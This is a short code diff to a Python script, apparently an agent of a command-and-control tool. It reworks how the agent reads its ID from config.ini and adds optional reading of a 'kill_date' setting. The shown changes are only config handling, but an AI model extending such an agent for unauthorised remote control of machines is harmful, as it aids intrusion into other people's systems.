@@ -261,9 +261,14 @@ if __name__ == '__main__':
     else:
         agent_config = configparser.ConfigParser()
         agent_config.read('config.ini')
-        agent_id = agent_config['AGENT']['id'] if 'id' in agent_config['AGENT'] \
-            else sys.exit('[+] Agent has no ID.\n[+] Agent Stopped!!')
-        print('[+] Agent already registered')
-
+        try:
+            agent_id = agent_config['AGENT']['id']
+            print('[+] Agent already registered')
+        except KeyError:
+            sys.exit('[+] Agent has no ID in config.ini\n[+] Agent Stopped!!')
+        try:
+            kill_date_string = agent_config['AGENT']['kill_date']
+        except KeyError:
+            pass
     send_output()
     config_file()
